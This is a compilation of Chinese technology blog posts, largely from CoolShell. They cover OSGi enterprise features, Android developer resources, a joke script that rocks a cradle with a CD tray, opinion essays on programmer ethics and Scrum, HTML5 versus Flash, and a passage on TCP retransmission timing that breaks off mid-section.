自从2007年1月第一次会议一来，OSGi企业专家组EEG用了两年时间编写了致力于使OSGi更好支持企业级Java应用的需求细节和设计细节。这个工作的成果是：在2009年年中，将会对OSGi规范有一个主要的更新(两个的草案版本已经发布)，这个修改主要包括扩展了核心框架服务和定义现有存在企业Java技术与OSGi框架的接口以满足业务应用需求的案例。主要的特性包括被称为蓝图服务(Blueprint Service)Spring框架组件模型到OSGi服务模型的映射和分布计算协议到OSGi服务模型的映射, JavaEE映射的关键部分是Web apps,JDBC,JPA,JMX,JTA,JNDI,和JAAS。软件行业已经接受并支持OSGi带来的模组化的好处，下一个改进将会是通过适配已经用于企业运算的Java技术接口，进而对企业级Java应用的支撑。这个目标将帮助OSGi的开发人员更容易的以标准的方式创建企业服务务应用程序。Eric Newcomer是分布计算的专家和独立咨询师，Newcomer是OSGi企业专家组的主席，之前他是IONA技术公司的CTO.他在 blog on OSGi发布了很多的OSGi的文章
# 实用Android开发工具和资源精选作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**出处** ：A Useful Selection of Android Developer Tools and Resources在google、开源平台，和来自移动电话制造商HTC,Samsung和Sony Ericsson的支持下，Android平台在市场占有率上相比去年取得的886%增长！如果我只看增长率，IPhone据统计才有61%的增长。这些数据可以给你关于两个平台流行度的印像，但是事实上，这些数据告诉了智能机开发员的谁才是真正的赢家。在时下，智能机越来越流行，因此成为一个快速增长的Android平台的智能机开发人员将会是一个不错的选择。相比较其他的平台，Android不依赖于任何约束第三方应用程序的私有的操作系统（题外话：美国最近宣布对于IPhone的破解和越狱是合法行为），Android本身就是开源的。由于开源，Android有巨大的开发社区支持。各种个样的例子和教程，GUI素材，和开发工具下载。几乎所有的都是免费提供的。我们选出接近20个可以免费或开源的，工具，资源，开发指南。希望这些资源能给你的Android应用带来帮助。   **相关文章参看:**
* Android App Developers GUI Kits, Icons, Fonts and Tools →   * iPhone and iPad Development GUI Kits, Stencils and Icons →   * Mobile Web and App Development Testing and Emulation Tools →   * 14 Free Mobile Application Development Icon Sets →### 免费的Android开发人员电子书:andbook如果你刚步入Android的开发，那么对于第一次开发Android应用程序的你来说，这本书是非常适合的。这本只有62页的PDF电子书里，有简单易懂的入门教程，帮助你在没有任何Android开发知识的背景下，教你开发Android应用程序。   Free Android Developer Ebook: andbook! →### 免费的Android开发人员电子书:专业Android应用程序开发专业Android应用程序开发PDF电子书，是一本创建移动手机应用程序的上手指南，这本书特点简洁，还有着能帮助你快速构建真实Android移动电话应用程序的典型的例子。本书覆盖了Android手机所有本质特性，并同时展示了Android手机的高级特性。   Free Android Developer Ebook: Professional Android Application Development →
### 免费和开源的应用程序* apps-for-android (Open Source Applications) →   这个链接中包含了许多实用的开源的Android应用程序。这些应用程序展示了Android的许多特性。* List of Sample Android Apps →（ **译者注：** 我勒个擦！墙掉了，中国Android开发人员杯具了，看来官方不给力啊，这次元还真是不毛之地啊）   这个Web页面是一个Android开发包中的实例程序列表。使用这个页面上的链接，你可以通过你的浏览器来阅读这些例子程序的源代码。你也可以把这些实例程序下载下来，当你需要的时候，你可以修改并使用他们。* Android Cookbook (Examples in Cookbook Form) →   这个站点有很多实用的Android示例程序，你完全可以重用这些例子。* OpenIntents →   OpenIntends 设计和实现了开放式 intents和接口，其使得Android移动应用程序能更紧密的结合在一起。同时OpenIntends免费的提供了更专业和复杂的实例应用程序来演示他们的用法。
* Android Snippets (Share Useful Snippets of Source Code) →   Android Snippets 是一个Android的实用代码段库，这个库是用来分享实用和优秀的Android应用程序代码；如果没有特别的需求，我们可以大量的重用这些代码库。### Windows上的Android对于那些想测试驱动Android的开发者，可以使用这个Android模拟器，这个模拟器以单独的应用程序的形式独立运行在Windows PC之上，使用这个模拟器不用下载和完全安装复杂的Android开发包。你甚至可以在这个模拟器上安装和测试Android系统兼容的应用程序。   Android Emulator on Windows →### 来自应用程序开发入门的Android模拟器Android的开发包中包含了一个移动设备模拟器。这个模拟器模仿了典型移动设备的硬件和软件特性(当然，不包含打电话)。这个模拟器提供各种个样的导航和控制按键，可以使用你的鼠标和键盘来“按”下这些按键为你的应用程序生成事件。这个模拟器也提供一个屏幕为你显示应用程序。同时，SDK中提供了很多能在模拟器上运行的应用程序。   Android Emulator from The Developer’s Guide →
### 感应模拟器感应模拟器是一个JAVA独立应用程序，感应模拟器模拟感应数据并把数据传给Android模拟器。这个感应模拟器可以让你模拟加速度仪器，指南针，和方向感应，这些数据可以用于Android应用程序，并通过感应器进行控制。   SensorSimulator →### DroidEx:大（巨）屏上的Android项目DroidEx 可以让你附加的Android设备的显示屏内容复制一份到你的开发机屏幕。使用DroidEx来做演示是非常有用的。因为你可以把你的Android设备连接到你的笔记本电脑上或投影仪上，你的客户就可以通过这些设备来看你Android设备上的内容。DroidEx还可以用来演示那些用模拟器不方便演示的内容，比如说GPS或加速度仪器等内容。   DroidEx: Projecting Android on the Big(ger) Screen →### Android的App InventorAndroid 的App Inventor是来自Google为非开发人员准备的新工具，通过这个工具，非开发人员可以非常容易地在里面创建应用程序。可以通过网站的视屏来预览这个工具的功能特性。(你可以参看酷壳的这篇文章)
( **译者注：** 这里还有一个youtube视屏，可惜也墙掉了）### 如何开发Android中的常用任务这是一个关于Android开发可能遇到的常用任务列表集合，并提供了一个快速、 how-to方式的帮助，来帮助你完成这些任务。Common Tasks and How to Do Them in Android→### 快速启动小抄快速启动小抄是一个非常实用和快速的列表，这个列表中罗列一些关于快速启动的相关任务。   Fastboot Cheat Sheet →### UI指导原则在这里你可以找一些到官方文章的连接，这些连接来自于“The Developer’s Guide”。这些文章的内容描述了关于Android可视交互应用程序的UI设计开发的指导原则。* Icon Design Guidelines →   * 图标指导原则描述每类图标的细节，并做关于尺寸，颜色，阴影其他的细节的规范，根据这些规范你的设计的图标可以适用于Android系统。你也可以下载Android图标模板包，这个包里面是一些Photoshop和Illustrator模板和滤镜文件，通过这个模板包你可以更简单的创建满足规范的图标。   * Download the Android Icon Templates Pack   * 控件设计指导描述了如何设计适合其他主页屏的控件。这个连接会连接到一些图形文件和模板，通过这些模板和文件可以使你设计更简单。   * Widget Design Guidelines →   * Activity和Task设计指导描述了活动的工作方式，并用图解示例演示了Activity，并描述了其重要的底层机制和原理，如多任务系统，Activity重用，intents，Activity栈，和Task。以设计层面的角度覆盖了活动的所有内容。   * Activity and Task Design Guidelines →   * 菜单设计指导描述了上下文菜单和选项菜单的不同。如何放置菜单项，何时放置屏幕命令，和其他的一些菜单细节。   * Menu Design Guidelines →
**理解Android中的用户接口 来自于mobiforge.com**这4部分的文档来自于mobiforge.com,文档中包含了组成Android UI的各种要素。文档的第一部分讨论Android中各种各样的有效的的布局。1.     1. Understanding User Interface in Android – Part 1 →     2. Understanding User Interface in Android – Part 2 →     3. Understanding User Interface in Android – Part 3 →     4. Understanding User Interface in Android – Part 4 →### Android UI模式Android UI Patterns →### DroidDraw:Android用户接口图形编辑器DroidDraw是一个为Android创建图形用户界面的UI设计器。它是一个独立的可执行程序，可以运行在Mac OS X，Windows和Linux上。DroidDraw : Graphical User Interface Editor for Android →
### Android GUI PSD 向量包Android GUI Starter Kit包里面包含了多个按钮元素和不同接口选项的AndroidGUI内容。这些元素是基于Android1.5 GUI的，并且这些包里面的被提供给开源社区的Android应用程序模型。大部分的GUI元素和手机图例都是使用向量路径制成，所以他们非常地容易被缩放。对于文本AndroidSans包被使用。   Android GUI PSD Vector Kit →### Android的Firworks Template在Fireworks模板中，Android的各种元素被以向量图形的方式被重绘。在目录中，这些元素的名称大多根据Android词汇表被命名。   Fireworks Template for Android →### Android线框模板线框PDF是信纸大小（8.5英寸 * 11英寸）并且各部件都被拉伸。因此你可以非常容易的以纸张原型或拉伸为真实尺寸的方式来使用。如果你没有信纸，你可以用A4纸来打印。   Android Wireframe Templates →   你也可以参考：* Android App Developers GUI Kits, Icons, Fonts and Tools →   * iPhone and iPad Development GUI Kits, Stencils and Icons →   * Mobile Web and App Development Testing and Emulation Tools →   * 14 Free Mobile Application Development Icon Sets →   * 45+ Cool Google Android Apps – The Perfect iPhone Replacement →
**（全文完）**# 用脚本实现哄小孩睡觉作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!baby_linux当然，不并需要一个天才式的人才能做到这个事，其实这个事情很简单。让我来一点一点向你解释。下面是一些准备工作。* 首先，你得找一台PC机，得配上光驱，光驱可以破一点。   * 然后，你得给这台PC机上装上Linux，不需要太多的东西，最基本的就行了。   * 然后，你得写下下面的代码。while [1 = 1]     do     #弹出光驱     eject     sleep 1#收回光驱     eject -t     sleep 1     done在运行代码之前，请确保你们小孩的摇篮和PC机的光驱连接在一起。当然，你也可以在脚本中播放一曲催眠曲。注意，脚本其中的sleep 1是为了配合上摇篮的节奏，这样需要你在实际过程中调试一下。这样的成本是不是有点高？居然还要达上一台电脑，呵呵。所以，我就不建议你用Windows来实现了，那样的成本可能会更高。# 消费者的消费观作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
原文：!How I feel about buying apps> **星巴克** ：这是你的venti-soy-whipped-frappa-lardy- > lattechino，也就$7.15，你需要加点糖吗？只需要再加$1.95。 > > **消费者** ：绝对要加。让我们的血糖值高到月亮上！!How I feel about buying apps> **票房** ：先生，想看“断背3D吗”？一张票只要$13！ > > **消费者** ：没问题！另外，有优惠吗？我想花$20再买点爆米花和碳酸饮料。!How I feel about buying apps> **Apple** ：新的iPhone 4G，加上税要$425.19 > > **消费者** ：只要$425？！这仅相当于我老婆把背上的毛给去掉价格的1/10！拿钱！花这点钱连想不用想。!How I feel about buying apps> **Apple** ：iPad 3GS 加一个保护盒，一共$875.24 > > **消费者** ：$875？这就些？啊，我要两个，一个给我，一个给我身边这个有毛的朋友。!How I feel about buying apps
> **网站** ：下载应用：HorseHunter Extreme！点击OK确认你想花$0.99买这个应用。 > > **消费者** ：什么？什么？什么？！99美分？！靠，我不知道……这么多钱啊！我应该把我的会技师找来，或是明天再说吧。（完）# 做个环保主义的程序员作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn****十多年前刚走入社会工作的时候，那时的中国软件开发根本没有什么版本管理，也没有什么编程规范，软件开发相比起今天来说非常地混乱，那时仅凭自己的一些学习总结了一些C语言编程中的好的小笔记，后来，这些笔记写成了一篇叫《编程修养》的文章。今天，又有些感触，想把这个话题扩大一下，从“个人修养”扩大到“环境保护”，所谓，穷则独善其身，富则达济天下，今天的技术人员比十多年前在技术和环境上都富有了许多，所以，也应该或多或少地担负起“达济天下”的责任了。环境保护说白了就是保护一个良好的环境，为好的环境添砖加瓦，与破坏环境的人和事做斗争。其实，从技术人员来说，我们可以做一些力所能及的事。因为我们身边的技术环境还有很大的改善的空间，而一些来之不易的东西还需要我们去小心维护。另外，对于我们自己来说，少吃一些垃圾食品，健康生活，对自己也有益。
#### 环保主义软件开发****先说说软件开发中的环保。比如：* **环保需求** 。当我们分析需求的时候，如果我们能做到不要像“这是到底是谁的错”一文中那样的来者不拒，如果我们在面对需求能多问这样几个问题：为什么 要有这样的需求？这个功能主要能解决什么 样的问题？为什么不是另外那一种？可不可以简化一下？其实，我们并不需要创新，只需要真正地问好这几个问题，我们就可以少看着一些弯路，少一些苦逼的加班，少一些内耗，少一些埋怨，也就可以为这个社会节省下一些资源，从而环保。* **环保开发** 。当我们做设计写代码的时候，如果我们多花一些时间去思考一下，我们就可以少一些代码（参看“多一些时间少一些代码”）。如果我们在一开始多思考一下，不要急着马上去用迭代的方式认识世界，多思考一下怎么把复杂的东西解藕，把复杂的东西简化，怎么做出一个优雅的设计，怎么让我们的程序少一些tricky的东西，怎么让我们的程序变得更简洁，更清楚，更直，在一开始思考一下未来需求可能的变化，未来软件需要怎么测试，未来的系统需要怎么的运维，那么，我们可以少一些返工，少一些重构，少欠一些债，少一些低级错误，少承担一些系统上线后的压力，那么，我们同样可以为这个社会节约一些资源。说得再直白一点，你用更少的代码产生出更高的效益，少耗一些CPU，就能省一些电，间接地保护了环境。（参看 Why C++？）
* **环保文化** 。当我们在做软件开发的时候，如果你能影响并帮助你身边的同事，让他们写出更有修养更有效率质量更高的代码来，并发动团队树立工程师的文化，用团队去影响你的老板，你的公司，让他们能再多一点地重视技术，重视技术人员，那么你必然也会成为一个受益者。* **环保管理** 。当你做为一个管理者，做为一个方法推动者，如果你能更多地注重软件开发中真正创造生产力的程序员，为他们分忧，为他们铺路，为他们创造条件，那么，他们就会更多的回馈于你，就会少了一些不信任，就会少了一些被动，就会多一些主动，就会多一分责任，不但可以激发团队热情，同时可以有更大的生产力。同样是一种环保。当然，这样的东西还有很多，你也可能会觉得太过理想主义了，我们不可能马上改变之，但是我们可以试一试。#### 技术环保主义其实，我们身边有很多可以做的技术环保工作。比如说，在Linux下少用root用户，SQL的时候，delete前先select，这样，你就不会做出一些让你后悔的事（参看程序员那些悲催的事），不会让你重头来过，从而至少不会浪费电能。写代码的时候要很小心管理好内存，以及各种资源，和线程并发，组织好的你的代码中的业务逻辑，做好单元测试，自动化回归测试，等，这样你就可以少一点遇到BUG，在遇到BUG时少一些时间去做调查。操作电脑的时候少下一些破解软件，少访问一些乱七八遭的网站，这样，你就会少中一些病毒，少一些损失，少一些重做系统，一样可以节省电能，最重要的是可以节省你的很多时间，让你可以去做一些更有价值 的事情。
当然，除此之外，我们更应该做为一个大气的，高瞻的环保主义者，比如下面的事情：* **拒绝IE6** 。如果你坚决不用IE6，并影响你身边的人，让他们升级IE6，尝试Chrome 或 Firefox，多告诉一下自己身边的朋友，怎么设计口令，怎么在互联网上保护自己的隐私和安全，怎么防木马，这样就能少一些问题，少装两次系统，就能省一些电，也就能多一些时间去做一些更有意义的事。也是在为整个世界整个人类做贡献。（ **看看某些软件产商，占据着用户桌面的江山，还整天弹窗弹窗的，说这不安全，那不安全的。你还是做安全的，你居然能容忍IE6装在用户的机器上，你还做个屁的安全！** ）2011年3月份，我国的IE6用户的百分比是34%， 那时中国网民4.5亿，平均每三个人中有一个，2012年3月份，中国的比例还有24%左右，不过中国的网民数达到了5.13亿，也就是说，平均5个人里有一个，但是中国依然是全世界的IE6占有量最大的，参看下图（来自：http://www.ie6countdown.com）面对下面的图片，你作何感想呢？_“ **Friend Don’t Let Friend Use IE6** ”_
* **拒绝破解软件** 。为什么要拒绝这些东西，因为你恐怕不知道这个软件的危害，包括一些汉化版的开源软件。这些软件中都会带 一些木马，比如：你下个putty的中文版，结果里有木马，人家就把你网站的口令盗了。关于网游，你可能不知道，连接网游私服的电脑基本上全是肉鸡，而 且，有很多的站点骗你下载软件破解程序，其实你下载到了一个木马。等等。这些生活都非常地不健康。* **拒绝抄袭和山寨** 。如果你鄙视那些赤祼祼地抄袭者，不使用他们的产品，有的人会说你就是想标榜自己的高尚，ZB，假高尚，大家会说你没有必要。其实并不是，你这样做，其实是为了“环保”，为了“保护一个健康的IT环境”，虽然你没有创新，但是你的行为却是在鼓励创新的环境，这样，如果当整个大环境都是在创新文化影响之下，才会更健康，技术人员也才会被尊重，而我们自己最终会受益。虽然只是抑制抄袭和山寨，但是我们间接地为社会做了贡献。（看看那N多的抄袭团队，加入他们实在是耗费这个社会的资源） （那个整天复制这个复制这个复制那个的公司，看看你自己做的那些产品线？乱糟糟的。 **你自己看看，你有个人空间，还有群空间，还有校友录，然后你还要做个facebook式的“朋友”，还要搞个微博，然后还要搞个微信，大哥啊，你把这些相似度很大的东西放在了N多的服务器上，你不觉得浪费吗？你真是山寨之王啊，自己都一直在复制自己的产品** 。还有人说你们的产品经理一流，真是脑残啊。对于你们的复制精神，我只能拜了！）
* **拒绝百度搜索** 。如果你学得百度还是可以的话，你不妨看看我的微博（这个，这个（抓图），还有和这个和 这个）（以前，百度搜索出来的很多的开源软件（PuTTY、WinSCP）的第一个链接全是带木马的，百度就是一个网上的病毒 )，你会发现百度不单单是广告的问题，很多东西根本搜不出来，包括他自己的内容。 **用百度就是浪费时间，浪费计算资源** 。如果你告诉你身边的朋友不要用百度搜索，而是用Google，并能耐心地教会他们翻墙，这样，我们就可以让那些“穷则穷凶极恶，富则为富不仁”的企业少一些自以为是，最重要的是可以让他们少制造一些垃圾信息和垃圾产品，世界少一些垃圾，自然也就环保了。* **拒绝过重的商业氛围** 。很多社区的商业氛围实在是太浓了，全都是广告。整个社区根本都不是为技术人员来做的，而为了那些软件产商，为了那些公司。他们只知道为那些大公司写软文，做广告，开大会。他们只想着挣钱。网页上全是花花绿绿的广告，打开他们的网页，就会多耗许多电，浏览他们网站上的文章，到他们的大会上听他们的软件广告分享，就会让自己的生命和时间浪费，自己消耗了体力不说，却还没得到什么营养，相当的不环保。* **拒绝浮燥** 。比如：浮燥地创业者们，被风投们一轮一轮地压榨。为了让风投满意，牺牲自己的初衷，去找水军刷排名，去发垃圾邮件，去烧钱买吆喝，制造虚假的繁荣，等等。另外，少去追那些新的技术，少一些浮夸，不要开口闭口的就是海量数据，高性能，要当个架构师，经理，要拿多少多少的工资，与其这样，还不如多静下心来研究一下那些十来年的技术，思考一下自己身边的问题，一步一步走踏实，少摔几个跟头，这样，你也就能多一些能力，多一些自信，也就能多做一些事，多解决一些问题，你的职业生源走好了，也就很环保了。
还有很多，我相信大家明白我想说什么。 ****其实，我想说的是， **这不单单是一种“个人修养”，这也是一种对社会贡献的方式，更是一种“低碳环保”的生活方式** 。**让我们一起来做有修养的环保主义的程序员吧，少吃一些垃圾食品，多一些绿色的健康生活！**_**—————— 更新 2012年4月27 ——————**_我看到很多网友并不同意我的观点，并指责我的偏激和极端。挺好的，我知道，我说到了你们最敏感的地方，我很高兴。**你可以对现实妥协，你可以继续钟爱你的垃圾食品，你可以继续使用百度搜索，你可以继续生活在墙内，我虽然替你感到惋惜，但是我不会勉强你，因为我能理解你可以不环保，本来也是，这些事情，你能做到固然好，你做不到，也是你的选择。每个人的生活每个人自己去选择，想健康地生活，或是不健康地生活，都是你自己的权利** 。（全文完）**   ****   **# HTML5 和 Flash 之争作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn_文章来源_二者之间的竞争会演变成为一场“战争”吗？（现在甚至出现了可以把Flash转成Javascript/HTML5的工具）
首先需要弄清楚二者之间最主要的区别，HTML 是一种语言（超文本标记语言 – HyperText Markup Language），而 Flash 是 Adobe（其收购了Macromedia）公司的一个浏览器插件（Plugin）。HTML5 目前还是 W3.org 规范中一个草案，这意味着其还没有最终定案，希望到 2012 年这项工作能够完成。以下是二者各自的一些特点：目录* HTML5   * Flash   * 结论   * HTML5 相关的一些链接#### **HTML5**这个新的技术更为易学和易用，比较 .FLA 和 .SWF 文件更容易编辑。并且基本上过去所有由 Flash 才能制作的动画效果都能够使用 JS + HTML5 + CSS 3 来完成，不过工作量可能会更大一些，不仅文件尺寸会增大，性能方面也会有影响。以前为 Web 表单设定风格我们一定需要使用到 JavaScript， 但是 HTML5 中的 contenteditable 属性让我们可以做得更多。一些新的输入类型（Types of Inputs）也被加入到 HTML5 中，如：电子邮件，数字，值范围等等。
用户不仅仅需要一个支持 HTML5 的浏览器，还需要 CCS 3 和新的 JavaScript 引擎的支持。免费（不包括第三方字体和音频视频等等）更好地移动设备支持（HTML5 正在被运用于 iPhone，iPod，iPad 和 Android 应用的开发）拖拽，事实上这不是 HTML5 的一部分，但是在新版本的 GMail 中，从桌面拖拽文件到浏览器能够用 HTML5 很好地实现。对于 Flash 我不知道这是否可以实现？#### **Flash**文件经过压缩，所以文件尺寸会比 HTML5 + CSS + JavaScript + 图像 + 其他 小。硬件优化需要安装 Flash 插件， Android 2.2（代号 FroYo）同样支持 Flash 插件。Adobe 在它的 Creative Suite 5 中包含了 Flash Builder 4.0。也许对很多人来说，相对于 HTML + JavaScript + CSS，Flash 应用 更难于“破解”。以下是一些 Flash 能够实现而 HTML5 + JavaScript + CSS 3 不能的功能：* 增强现实（Augmented Reality）   * 3D   * 真正的面向对象，而非原型（Prototyping）   * 对麦克风和摄像头的支持（事实上 HTML5 已经宣布要提供这些支持）   * 混色模式（如：渐进色，重叠色等等）   * Action Message Format （AMF）   * 二进制数据（Binary Data）   * 位图数据（BitMapData，HTML5 的画布 Canvas 和矢量标记语言 VML 可以实现近似的功能）   * 图形处理器的利用（Use of GPU）
#### 结论HTML5 是一项新技术，很多人会想要尝试它，而 Flash 业已存在很久，并且还将会有很长的生命周期。HTML5 短期内无法完全替代 Flash，而 Flash 可以作为 HTML5 的一个很好的补充。#### HTML5 相关的一些链接* HTML5 Browser Compatibility Test   * HTML5 by Apple   * HTML5 Demos   * HTML5 Rocks   * HTML5 Watch, not necessarily HMTL5 but interesting applies of JS like the Google Pacman   * Chrome Experiments   * Learn HTML5: 10 must read lessons# 为什么Scrum不行？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这篇文章的原文在这里（原文链接）（ **下文不是全译，也不是部分译，我只是把其总结，有我自己的发挥，但是原意大致不变** ），这篇文章完全是在调侃Scrum的，作者第一段就是一个免费声明，其说他是Scrum)和其它敏捷方法的big fan， 他也认为Scrum 100% 对 软件开发可行。作者使用Scrum 5年了，也公开作过几次敏捷的分享会。他觉得写这篇文章只是为了好玩，因为他们戴上Edward de Bono 的 black hat （黑礼帽 – 是6个思考之帽中的一种——负面思考，思考事物的负面因素，这样才知道：它会起作用吗？缺点是什么？它有什么问题？为什么不能做。）
因为本人经常站在Agile的风口浪尖，所以我有必要也来一个“免责声明”。Shit！其实我想来的是“ **不免责声明** ” —— **下文中的九大原因是对中国的各种Agile实践者咨询师不注重实际只重方法论的批判** ， **本人必然要和那种只以流程方法论为中心的软件开发斗争到底** 。其实我没有那么嚣张， **我只是想说，下面的这些东西相当的现实。 希望各种Scrum的实践者们认识到这些问题，从而可以让你们明白软件开发中的人的重要性**。**Reason 1** : Scrum) 的基石是相信人。创造一个安全的环境，这样每个人都能相互学习，相互直言。但是，这是不行的，这世上有很多人并不关心这些，而且政治和竞争到处都是，办公室里无小事，你和别人交心，你相信他们，最终受伤的你自己。你真的以为那里有空间让你可以去犯错，去冒险吗？别天真了！你啊，too young, too simple, sometimes naive!**Reason 2** : Scrum) 认为只要给员工足够多的自由员工就能做得最好。这该死是理论是基于什么玩意？不可能，人的天性是懒惰的，他们才不会把事做好的，他们只会做相应报酬的工作量，还可能基本还达不到其相应的报酬，大多数人都在混日子啊。尤其是和经理比起来，谁不想能尽快地成为经理或Team leader啊，因为那样他们就可以即不干活，又挣得多。另外，你给他们自由，你就会发现，他们会只会做他们感兴趣的事，要么聊QQ，要么打游戏，看闲书，反正不干正事。直到你催了，他们才动一动。
**Reason 3** : 因为前面的原因，所以，我们仍然要把一个PM放在Scrum团队的上面做管理，这样才会有产出。于是，PM给团队分配任何，管得细枝末节，事无巨细，天天让你做进度汇报，等等。直至把团队拖垮。**Reason 4** : Scrum) 只不过是一个流程。这世上有太多的流程，尤其是那那些操CMMi的公司。几乎所有玩CMMi流程的公司，你都能看到的是员工都是那一副副苦逼的脸。所以，Scrum的流程同样会这样。因为这些都不是开发团队自发出来的，而是上面管你喜欢不喜欢按给你的。 Scrum 根本不可能增进你的软件质量和技术，只能是优秀的人才才可能！使用Scrum的公司都是些吝啬鬼，他们不愿花大钱招优秀的人，他们妄图使用Scrum这种东西让现有的这些廉价劳动力发挥更大的生产效率，Scrum成了push程序员最有用的工具。**Reason 5** : Scrum) delivers ‘business value’。不是这样的，实际上，Scrum不可能。这有很多原因。真正了解业务的那帮人根本不可能加入项目团队，那些人谁TMD愿意和苦逼的技术人员加班啊。 那些人喜欢和我们的用户吃吃喝喝，花天酒地的，根本不会和你们那些奇怪的东西（如：backlog）或是那堆ugly的内向古怪的技术人员打交道，更别说什么技术了。所以，你的团队就像一个客服团队或救火队一样疲于奔命。
**Reason 6** : 一个敏捷的团队应该是持续进步的。这就是为什么Scrum总是在问什么干得好，什么需要改进，并定义行动方案。你真的以为员工想进步吗？让他们不得不去想想自己和团队怎么进步，然后他们还不得不去执行行动方案。别天真了，人的天性是不喜欢改变的，人的天性是习惯于一些按部就般的事的，也许那样做令人讨厌，但是人家还是能干点东西出来。如果你逼着人家改变，你就是在压迫人家，人家自然会反抗。**Reason 7** : Product Owner 专注于 ‘what’ 和 ‘why’ 的问题，开发团队决定 ‘how’。很不错的分工，于是可以造就一个即高速有重质量的团队。然而，这根本不行。你的Product Owner马上就想要这个功能，他才不管你的软件开发的技术难题，人家只要快，要你meet deadline，要你给我们重要的客户做出承诺。另外，你千万不要以为你们可以哄走这个初级的product owner，因为他的后台是直接汇报到高层管理。你作为一个程序员可能只是其个小部门的一个小喽啰，或者只是外包公司，你觉得可能吗？你觉得建立信任可能吗？**Reason 8** : 软件质量和生产率成正比。也就是说，质量越高，生产率越高。如果质量不高，你开发效率就会低下，但是谁管呢？我们朝九晚五的上班，质量好了也是做8小时，质量差了也是做8小时，无所为嘛。另外，我们的 project manager (或者是Scrum master!) 总是会批评我们没有按计划完成。所以，这根本 不可能。
**Reason 9** : “是的，如果我们只做需要的功能，那么我们就会最低的成本，对吗？”，为什么这世上总是会有这些幼稚的人？这种事怎么可能啊。很多很多的银行或保险公司的项目在你还没有启动项目前就谈好了一个价格（可能还会有回扣），为了打单子，销售什么都干得出来，让你去做项目是因为你是廉价劳动力，而且，他们会不断地加需求，因为软件合同谈好的价格时候，连需求都没有，你去做了才有，还是模糊和不确定或根本就是错的，然后需求是越来越多，越改越多。等你精疲力尽的时候，你才意识到，销售早就把你卖了。爽啊，戴着黑礼帽思考问题比我想像中的要有趣得多，现在我必需要把它摘下来了。**看完这篇文章，你觉得是人的问题还是软件开发方法的问题？**（全文完）# TCP 的那些事儿（下）作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这篇文章是下篇，所以如果你对TCP不熟悉的话，还请你先看看上篇《TCP的那些事儿（上）》 上篇中，我们介绍了TCP的协议头、状态机、数据重传中的东西。但是TCP要解决一个很大的事，那就是要在一个网络根据不同的情况来动态调整自己的发包的速度，小则让自己的连接更稳定，大则让整个网络更稳定。在你阅读下篇之前，你需要做好准备，本篇文章有好些算法和策略，可能会引发你的各种思考，让你的大脑分配很多内存和计算资源，所以，不适合在厕所中阅读。
目录* TCP的RTT算法     * 经典算法     * Karn / Partridge 算法     * Jacobson / Karels 算法   * TCP滑动窗口     * Zero Window     * Silly Window Syndrome   * TCP的拥塞处理 – Congestion Handling     * 慢热启动算法 – Slow Start     * 拥塞避免算法 – Congestion Avoidance     * 拥塞状态时的算法     * 快速恢复算法 – Fast Recovery     * 算法示意图     * FACK算法   * 其它拥塞控制算法简介     * TCP Vegas 拥塞控制算法     * HSTCP(High Speed TCP) 算法     * TCP BIC 算法     * TCP WestWood算法     * 其它   * 后记#### TCP的RTT算法从前面的TCP重传机制我们知道Timeout的设置对于重传非常重要。* 设长了，重发就慢，丢了老半天才重发，没有效率，性能差；   * 设短了，会导致可能并没有丢就重发。于是重发的就快，会增加网络拥塞，导致更多的超时，更多的超时导致更多的重发。
而且，这个超时时间在不同的网络的情况下，根本没有办法设置一个死的值。只能动态地设置。 为了动态地设置，TCP引入了RTT——Round Trip Time，也就是一个数据包从发出去到回来的时间。这样发送端就大约知道需要多少的时间，从而可以方便地设置Timeout——RTO（Retransmission TimeOut），以让我们的重传机制更高效。 听起来似乎很简单，好像就是在发送端发包时记下t0，然后接收端再把这个ack回来时再记一个t1，于是RTT = t1 – t0。没那么简单，这只是一个采样，不能代表普遍情况。##### 经典算法RFC793 中定义的经典算法是这样的：1）首先，先采样RTT，记下最近好几次的RTT值。2）然后做平滑计算SRTT（ Smoothed RTT）。公式为：（其中的 α 取值在0.8 到 0.9之间，这个算法英文叫Exponential weighted moving average，中文叫：加权移动平均）**SRTT = ( α * SRTT ) + ((1- α) * RTT)**3）开始计算RTO。公式如下：**RTO = min [ UBOUND, max [ LBOUND, (β * SRTT) ] ]**
其中：* UBOUND是最大的timeout时间，上限值   * LBOUND是最小的timeout时间，下限值   * β 值一般在1.3到2.0之间。##### Karn / Partridge 算法但是上面的这个算法在重传的时候会出有一个终极问题——你是用第一次发数据的时间和ack回来的时间做RTT样本值，还是用重传的时间和ACK回来的时间做RTT样本值？这个问题无论你选那头都是按下葫芦起了瓢。 如下图所示：* 情况（a）是ack没回来，所以重传。如果你计算第一次发送和ACK的时间，那么，明显算大了。   * 情况（b）是ack回来慢了，但是导致了重传，但刚重传不一会儿，之前ACK就回来了。如果你是算重传的时间和ACK回来的时间的差，就会算短了。所以1987年的时候，搞了一个叫Karn / Partridge Algorithm，这个算法的最大特点是—— **忽略重传，不把重传的RTT做采样** （你看，你不需要去解决不存在的问题）。但是，这样一来，又会引发一个大BUG—— **如果在某一时间，网络闪动，突然变慢了，产生了比较大的延时，这个延时导致要重转所有的包（因为之前的RTO很小），于是，因为重转的不算，所以，RTO就不会被更新，这是一个灾难** 。 于是Karn算法用了一个取巧的方式——只要一发生重传，就对现有的RTO值翻倍（这就是所谓的 Exponential backoff），很明显，这种死规矩对于一个需要估计比较准确的RTT也不靠谱。
